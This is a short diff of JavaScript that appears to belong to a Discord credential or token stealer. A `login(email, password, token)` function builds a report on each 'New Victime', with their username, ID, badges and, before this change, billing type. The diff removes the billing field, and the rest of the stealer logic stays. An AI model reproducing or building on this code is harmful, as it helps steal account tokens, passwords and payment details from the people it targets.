@@ -670,11 +670,6 @@ const login = async (email, password, token) => {
             value: `${badges}`,
             inline: true,
           },
-          {
-            name: '<a:6132lightblueheartspin:985668720422682724> @SN - Billing Type:',
-            value: `${billing}`,
-            inline: true,
-          },
         ],
         author: {
           name: "New Victime 👀 is " + json.username +"#" + json.discriminator + " - " +"("+json.id+")",
